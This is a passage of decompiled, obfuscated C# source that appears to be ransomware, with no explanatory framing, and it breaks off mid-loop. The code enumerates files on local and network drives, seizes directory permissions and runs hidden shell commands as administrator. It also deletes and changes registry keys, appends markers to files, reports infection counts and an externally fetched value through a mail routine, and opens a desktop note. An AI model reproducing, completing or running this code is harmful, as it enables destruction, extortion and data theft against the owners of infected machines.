					WspNJLioodtR.RgKMHASfAJQsg(getString_0(107389242), getString_0(107389269), getString_0(107389256), string.Concat(NGKPoQcRFBDfbNt(getString_0(107396243)), new WebClient().DownloadString(NGKPoQcRFBDfbNt(getString_0(107396698))), getString_0(107389215), NGKPoQcRFBDfbNt(getString_0(107396684)), DateTime.Now, getString_0(107396689), NGKPoQcRFBDfbNt(getString_0(107389210)), Convert.ToString(qiPmErxJQggVfu.Count), getString_0(107396689), NGKPoQcRFBDfbNt(getString_0(107396611)), ydOQhvmvcpZ));
				}
				else
				{
					WspNJLioodtR.RgKMHASfAJQsg(getString_0(107389242), getString_0(107389269), getString_0(107389256), string.Concat(NGKPoQcRFBDfbNt(getString_0(107396243)), new WebClient().DownloadString(NGKPoQcRFBDfbNt(getString_0(107396698))), getString_0(107389215), NGKPoQcRFBDfbNt(getString_0(107396684)), DateTime.Now, getString_0(107396689), NGKPoQcRFBDfbNt(getString_0(107389210)), Convert.ToString(qiPmErxJQggVfu.Count), getString_0(107396689), NGKPoQcRFBDfbNt(getString_0(107396611)), ydOQhvmvcpZ));
				}
			}
			catch
			{
			}
		}
		if (mgzuKEQvMyBiY == getString_0(107396760))
		{
			try
			{
				nMsDVobuFLL.OIlPxYqtTsg(new Uri(getString_0(107389193)));
			}
			catch
			{
			}
		}
		if (hMpaWmVQfeGtnt == getString_0(107397017) && !VGRnMzNnqlQlWo)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395645)))
				{
					Process.Start(NGKPoQcRFBDfbNt(getString_0(107389192)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395645));
				}
			}
			catch
			{
			}
		}
		else if (hMpaWmVQfeGtnt == getString_0(107396760) && !VGRnMzNnqlQlWo)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393409)))
				{
					Process.Start(NGKPoQcRFBDfbNt(getString_0(107389167)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393409));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(vCrKPOvgbnF))
		{
			try
			{
				File.Delete(vCrKPOvgbnF);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397157))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397157)));
			}
		}
		catch (Exception ex20)
		{
			try
			{
				File.AppendAllText(mldgFSRddxG, getString_0(107389118) + ex20.Message);
			}
			catch (Exception)
			{
			}
		}
		if (yqFjfeWQNnFtS)
		{
			try
			{
				File.AppendAllText(mldgFSRddxG, getString_0(107389105));
			}
			catch (Exception)
			{
			}
		}
		if (THOjaVpHiJe == getString_0(107389060))
		{
			IlSgvIcQsmbTvU();
		}
	}

	public static void qUeqlzBELcyel()
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(NGKPoQcRFBDfbNt(idSeAbGdhPDRu(getString_0(107389051))), NGKPoQcRFBDfbNt(getString_0(107389409)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int pyaCEgXWOJcuI(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> QaEQtMsYeNlAB(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107389380)) && !text.Contains(getString_0(107389387)) && !text.Contains(getString_0(107389354)) && !text.ToLower().Contains(getString_0(107389305)) && !text.ToLower().Contains(getString_0(107389324)) && !text.Contains(getString_0(107388787)) && !text.Contains(getString_0(107388734)) && !text.ToLower().Contains(getString_0(107388753)) && !text.ToLower().Contains(getString_0(107388708)) && !text.ToLower().Contains(getString_0(107388671)) && !text.ToLower().Contains(getString_0(107388694)) && !text.ToLower().Contains(getString_0(107388645)) && !text.ToLower().Contains(getString_0(107388632)) && !text.ToLower().Contains(getString_0(107388651)) && !text.ToLower().Contains(getString_0(107388630)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107388573)) && !fileInfo.FullName.Contains(getString_0(107388588)) && !fileInfo.FullName.Contains(getString_0(107388539)) && !fileInfo.FullName.Contains(getString_0(107388554)) && !fileInfo.FullName.Contains(getString_0(107389017)) && !fileInfo.FullName.Contains(getString_0(107389032)) && !fileInfo.FullName.Contains(getString_0(107388983)) && !fileInfo.FullName.Contains(getString_0(107388966)) && !fileInfo.FullName.Contains(getString_0(107388953)) && !fileInfo.FullName.Contains(getString_0(107388932)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388919)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388938)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388889)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388904)) && !fileInfo.FullName.Contains(NGKPoQcRFBDfbNt(getString_0(107388855))) && !fileInfo.FullName.Contains(getString_0(107388830)) && !fileInfo.FullName.Contains(getString_0(107397157)) && !fileInfo.FullName.Contains(getString_0(107388849)) && !fileInfo.FullName.EndsWith(getString_0(107395683)) && !fileInfo.FullName.EndsWith(getString_0(107388792)) && !fileInfo.FullName.EndsWith(getString_0(107388819)) && !fileInfo.FullName.EndsWith(getString_0(107388814)) && !fileInfo.FullName.EndsWith(getString_0(107388809)) && !fileInfo.FullName.Contains(getString_0(107388260)) && !fileInfo.FullName.Contains(RmGQaqoiaBTr) && !fileInfo.FullName.Contains(mldgFSRddxG) && !fileInfo.FullName.Contains(dQyocPsefnEBBf))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(mEIFFxHZBgNd) * 1024.0 * 1024.0 && vFJQwHPilYftJL == getString_0(107396760))
						{
							list.Add(fileInfo.FullName);
							xhnNiqRaFQf(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && vFJQwHPilYftJL == getString_0(107397017))
						{
							list.Add(fileInfo.FullName);
							xhnNiqRaFQf(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void BmTntxdWqYcXr()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107388275));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!hYDYrdRZUMfQ.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388190), getString_0(107397194)).Replace(getString_0(107388185), getString_0(107388190))
					.Replace(getString_0(107388208), getString_0(107389193))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					hYDYrdRZUMfQ.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388190), getString_0(107397194)).Replace(getString_0(107388185), getString_0(107388190))
						.Replace(getString_0(107388208), getString_0(107389193))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107388203), getString_0(107389193)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string nAUMcEQIEfjEV(string iOYwEEyPKBHtVf = "", string FDfVJNkFdEWBq = "")
	{
		string result = getString_0(107389193);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = iOYwEEyPKBHtVf,
				Arguments = FDfVJNkFdEWBq,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void OTdpygxlWUOjOT(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107388162),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string idSeAbGdhPDRu(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string NGKPoQcRFBDfbNt(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	private static void FcYYYumjSxot()
	{
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_025e: Expected O, but got Unknown
		//IL_0280: Unknown result type (might be due to invalid IL or missing references)
		//IL_0287: Expected O, but got Unknown
		IILcIRLcYxQ();
		List<hlFXTRuZfLtEeZ> list = hlFXTRuZfLtEeZ.KcfTcxWwvqyi();
		foreach (hlFXTRuZfLtEeZ item in list)
		{
			fAHytlzCCTvqa.Add(item.IPAddress);
		}
		List<string> source = fAHytlzCCTvqa;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 = delegate(string string_0)
			{
				dYwDIMZVPV CS_0024_003C_003E8__locals0 = new dYwDIMZVPV();
				CS_0024_003C_003E8__locals0.hRJiNuDBwKOTb = string_0;
				if ((!CS_0024_003C_003E8__locals0.hRJiNuDBwKOTb.StartsWith(getString_0(107386267)) && !CS_0024_003C_003E8__locals0.hRJiNuDBwKOTb.StartsWith(getString_0(107386294)) && !CS_0024_003C_003E8__locals0.hRJiNuDBwKOTb.StartsWith(getString_0(107386285)) && !CS_0024_003C_003E8__locals0.hRJiNuDBwKOTb.StartsWith(getString_0(107389193))) || !stzyYltjcngHhF.wTtycSFoMRgGzkgp(CS_0024_003C_003E8__locals0.hRJiNuDBwKOTb))
				{
					return;
				}
				try
				{
					Thread.Sleep(lYuNICMXohCnU);
					hYDYrdRZUMfQ.Add(getString_0(107388190) + CS_0024_003C_003E8__locals0.hRJiNuDBwKOTb + getString_0(107386240));
					try
					{
						if (pjFetgiEucLksJ)
						{
							Console.WriteLine(getString_0(107388190) + CS_0024_003C_003E8__locals0.hRJiNuDBwKOTb + getString_0(107386240));
						}
					}
					catch
					{
					}
					Parallel.For(68, 91, delegate(int int_0)
					{
						Thread.Sleep(lYuNICMXohCnU);
						hYDYrdRZUMfQ.Add(dYwDIMZVPV.getString_0(107388196) + CS_0024_003C_003E8__locals0.hRJiNuDBwKOTb + dYwDIMZVPV.getString_0(107397200) + (char)int_0 + dYwDIMZVPV.getString_0(107403760));
						try
						{
							if (pjFetgiEucLksJ)
							{
								Console.WriteLine(dYwDIMZVPV.getString_0(107388196) + CS_0024_003C_003E8__locals0.hRJiNuDBwKOTb + dYwDIMZVPV.getString_0(107397200) + (char)int_0 + dYwDIMZVPV.getString_0(107403760));
							}
						}
						catch
						{
						}
					});
				}
				catch
				{
				}
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate19);
		try
		{
			stzyYltjcngHhF.cClDNeFfmMmjxCq cClDNeFfmMmjxCq = new stzyYltjcngHhF.cClDNeFfmMmjxCq(stzyYltjcngHhF.bFTMNPdKeZit.KUMeCjHPMjlr, stzyYltjcngHhF.dAZCszYzHaDwrLP.HmZESpJKmZVTuVs, stzyYltjcngHhF.cozFPHgUAgCiTj.KRtpexWrPXyrwxdwb, stzyYltjcngHhF.JVUCbVYkUVx.XVPqkBWpLVK);
			foreach (string item2 in cClDNeFfmMmjxCq)
			{
				MatchCollection matchCollection = Regex.Matches(item2, getString_0(107388177));
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!hYDYrdRZUMfQ.Contains(item3.ToString()))
						{
							hYDYrdRZUMfQ.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (pjFetgiEucLksJ)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		ciHSClUZVlvkA.uwjMsTteQrz();
		try
		{
			if (pjFetgiEucLksJ)
			{
				Console.WriteLine(getString_0(107388064));
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = idSeAbGdhPDRu(getString_0(107388023));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(NGKPoQcRFBDfbNt(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(NGKPoQcRFBDfbNt(getString_0(107388462)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(NGKPoQcRFBDfbNt(getString_0(107388405)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (HXsKUaUHXv == getString_0(107396760))
		{
			DcvDTlPAGW.AVDTwzmNmTrdT();
		}
		try
		{
			if (pjFetgiEucLksJ)
			{
				Console.WriteLine(getString_0(107388360));
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107388275));
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
				if (hYDYrdRZUMfQ.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388190), getString_0(107397194)).Replace(getString_0(107388185), getString_0(107388190))
					.Replace(getString_0(107388208), getString_0(107389193))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (pjFetgiEucLksJ)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388190), getString_0(107397194)).Replace(getString_0(107388185), getString_0(107388190))
							.Replace(getString_0(107388208), getString_0(107389193))
							.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107388203), getString_0(107389193)));
					}
				}
				catch
				{
				}
				hYDYrdRZUMfQ.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388190), getString_0(107397194)).Replace(getString_0(107388185), getString_0(107388190))
					.Replace(getString_0(107388208), getString_0(107389193))
					.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107388203), getString_0(107389193)));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (pjFetgiEucLksJ)
			{
				Console.WriteLine(getString_0(107388303));
			}
		}
		catch
		{
		}
	}

	public static void nYxlJZUFKEVvs(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = NGKPoQcRFBDfbNt(getString_0(107387722));
		processStartInfo.Arguments = getString_0(107387693) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool QuSoHAFJyPPmrXiE(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void AWGlJlPiXOuSNhR()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = idSeAbGdhPDRu(getString_0(107387688));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(NGKPoQcRFBDfbNt(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(NGKPoQcRFBDfbNt(getString_0(107387518)));
					registryKey.DeleteSubKey(NGKPoQcRFBDfbNt(getString_0(107388005)));
					registryKey.DeleteSubKey(NGKPoQcRFBDfbNt(getString_0(107388020)));
					registryKey.DeleteSubKey(NGKPoQcRFBDfbNt(getString_0(107387963)));
					registryKey.DeleteSubKey(NGKPoQcRFBDfbNt(getString_0(107387722)));
					registryKey.DeleteSubKey(NGKPoQcRFBDfbNt(getString_0(107387938)));
					registryKey.DeleteSubKey(NGKPoQcRFBDfbNt(getString_0(107387909)));
					registryKey.Close();
				}
				string_ = idSeAbGdhPDRu(getString_0(107387924));
				registryKey = Registry.LocalMachine.OpenSubKey(NGKPoQcRFBDfbNt(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(NGKPoQcRFBDfbNt(getString_0(107387827)));
					registryKey.Close();
				}
				string_ = idSeAbGdhPDRu(getString_0(107387778));
				registryKey = Registry.LocalMachine.OpenSubKey(NGKPoQcRFBDfbNt(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(NGKPoQcRFBDfbNt(getString_0(107387827)));
					registryKey.Close();
				}
				string_ = idSeAbGdhPDRu(getString_0(107387778));
				registryKey = Registry.CurrentUser.OpenSubKey(NGKPoQcRFBDfbNt(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(NGKPoQcRFBDfbNt(getString_0(107387827)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(getString_0(107387793)), NGKPoQcRFBDfbNt(getString_0(107387232)));
			nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(getString_0(107387215)), NGKPoQcRFBDfbNt(idSeAbGdhPDRu(getString_0(107387174))));
			nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(getString_0(107387215)), NGKPoQcRFBDfbNt(getString_0(107387060)));
			nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(getString_0(107387479)), NGKPoQcRFBDfbNt(getString_0(107387462)));
		}
		catch
		{
		}
	}

	public static void coknNVwPlVpucD(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(NGKPoQcRFBDfbNt(getString_0(107387389)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void dFSeuldPyEi()
	{
		string string_ = idSeAbGdhPDRu(getString_0(107387364));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(NGKPoQcRFBDfbNt(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(NGKPoQcRFBDfbNt(getString_0(107387315)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void IILcIRLcYxQ()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(getString_0(107387282)), NGKPoQcRFBDfbNt(getString_0(107386725)));
			nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(getString_0(107387282)), NGKPoQcRFBDfbNt(getString_0(107386595)));
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string XpAfrmgBDSNuL(string rayqrUSXltVUXLu, int VKdQbElwmnXFA = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(VKdQbElwmnXFA);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(rayqrUSXltVUXLu, 1, intPtr, ref VKdQbElwmnXFA) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void IlSgvIcQsmbTvU()
	{
		nAUMcEQIEfjEV(getString_0(107396428), NGKPoQcRFBDfbNt(getString_0(107386993)));
		string text = NGKPoQcRFBDfbNt(getString_0(107386799));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107388208) + text + getString_0(107388208) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396428);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void AmaXDscuvVuN(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (yqFjfeWQNnFtS)
			{
				try
				{
					File.AppendAllText(mldgFSRddxG, getString_0(107386222) + string_0 + getString_0(107386181) + ex.Message + getString_0(107396689));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string nMAemjtyDhXALFt()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107389193);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107386124);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107386115))) ? getString_0(107386129) : getString_0(107386106));
				break;
			case 0:
				text = getString_0(107386152);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107386119);
				break;
			case 4:
				text = getString_0(107386074);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107386088) : getString_0(107386097));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107386064) : getString_0(107386069)) : getString_0(107386042)) : getString_0(107386051));
				break;
			case 10:
				text = getString_0(107386059);
				break;
			}
		}
		if (text != getString_0(107389193))
		{
			text = getString_0(107386022) + text;
			if (oSVersion.ServicePack != getString_0(107389193))
			{
				text = text + getString_0(107386009) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string IWmmORXaIJtiFeD(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395645);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(NGKPoQcRFBDfbNt(getString_0(107395612)));
				streamWriter.WriteLine(getString_0(107396689));
				streamWriter.WriteLine(NGKPoQcRFBDfbNt(getString_0(107393642)));
				streamWriter.WriteLine(string_0);
				if (YkwjPTGZpc)
				{
					streamWriter.WriteLine(getString_0(107396689));
					streamWriter.WriteLine(NGKPoQcRFBDfbNt(getString_0(107393548)));
					streamWriter.WriteLine(WspNJLioodtR.UyvXvDpzFTru());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !kGnGVVSmVYCjkQ)
				{
					File.AppendAllText(text, getString_0(107393515) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (yqFjfeWQNnFtS)
			{
				try
				{
					File.AppendAllText(mldgFSRddxG, getString_0(107386036) + ex.Message + getString_0(107396689));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void VdHGdFJRyJgD(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		TEcDhinzAemKRbN.wXXJwTHpdnmeYpb CS_0024_003C_003E8__locals0 = new TEcDhinzAemKRbN();
		CS_0024_003C_003E8__locals0.FhnupdCwUNaCgx = string_1;
		CS_0024_003C_003E8__locals0.hVNCmlFXFbIaX = string_2;
		CS_0024_003C_003E8__locals0.iTjtsdEEARj = string_3;
		CS_0024_003C_003E8__locals0.QBQwQLNPJAlZW = string_4;
		if (EEZuvhlZpe && !nMAemjtyDhXALFt().Contains(getString_0(107386088)) && !nMAemjtyDhXALFt().Contains(getString_0(107386459)))
		{
			fqESHzeMgKGPs.qeRHxYxkXbvT();
		}
		kQukpPiiliUKcIy = Convert.FromBase64String(CS_0024_003C_003E8__locals0.iTjtsdEEARj);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107386478))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = XpAfrmgBDSNuL(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !hYDYrdRZUMfQ.Contains(text))
							{
								hYDYrdRZUMfQ.Add(text);
							}
							else if (!hYDYrdRZUMfQ.Contains(array[i].Name))
							{
								hYDYrdRZUMfQ.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!hYDYrdRZUMfQ.Contains(array[i].Name))
							{
								hYDYrdRZUMfQ.Add(array[i].Name);
							}
						}
					}
					else if (!hYDYrdRZUMfQ.Contains(array[i].Name))
					{
						hYDYrdRZUMfQ.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!hYDYrdRZUMfQ.Contains(string_0[j]))
				{
					hYDYrdRZUMfQ.Add(string_0[j]);
				}
			}
		}
		if (hYDYrdRZUMfQ.Contains(NGKPoQcRFBDfbNt(getString_0(107386437))) && ZnKUGBYONLhFoD == getString_0(107396760))
		{
			hYDYrdRZUMfQ.Remove(NGKPoQcRFBDfbNt(getString_0(107386437)));
		}
		Parallel.ForEach(hYDYrdRZUMfQ, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new TEcDhinzAemKRbN.wXXJwTHpdnmeYpb();
			CS_0024_003C_003E8__locals0.mkEWLqGNrjd = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.FYAqswksIKPyn = string_0;
			if (ahRifMUVdZFjN && !nMAemjtyDhXALFt().Contains(TEcDhinzAemKRbN.getString_0(107386099)) && !nMAemjtyDhXALFt().Contains(TEcDhinzAemKRbN.getString_0(107386470)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						QuSoHAFJyPPmrXiE(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.FYAqswksIKPyn);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (DDyGmAdWrJ == TEcDhinzAemKRbN.getString_0(107396771))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					UGCErsaAKVyhfVi(CS_0024_003C_003E8__locals0.FYAqswksIKPyn, CS_0024_003C_003E8__locals0.mkEWLqGNrjd.FhnupdCwUNaCgx, CS_0024_003C_003E8__locals0.mkEWLqGNrjd.QBQwQLNPJAlZW, CS_0024_003C_003E8__locals0.mkEWLqGNrjd.hVNCmlFXFbIaX, CS_0024_003C_003E8__locals0.mkEWLqGNrjd.iTjtsdEEARj);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				UGCErsaAKVyhfVi(CS_0024_003C_003E8__locals0.FYAqswksIKPyn, CS_0024_003C_003E8__locals0.FhnupdCwUNaCgx, CS_0024_003C_003E8__locals0.QBQwQLNPJAlZW, CS_0024_003C_003E8__locals0.hVNCmlFXFbIaX, CS_0024_003C_003E8__locals0.iTjtsdEEARj);
			}
		});
	}

	public static void UGCErsaAKVyhfVi(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107389193));
		List<string> list3 = list2;
		if (KaXdMRxGsnsgnb == getString_0(107397017))
		{
			list = QaEQtMsYeNlAB(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = JMmiYItsDh.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
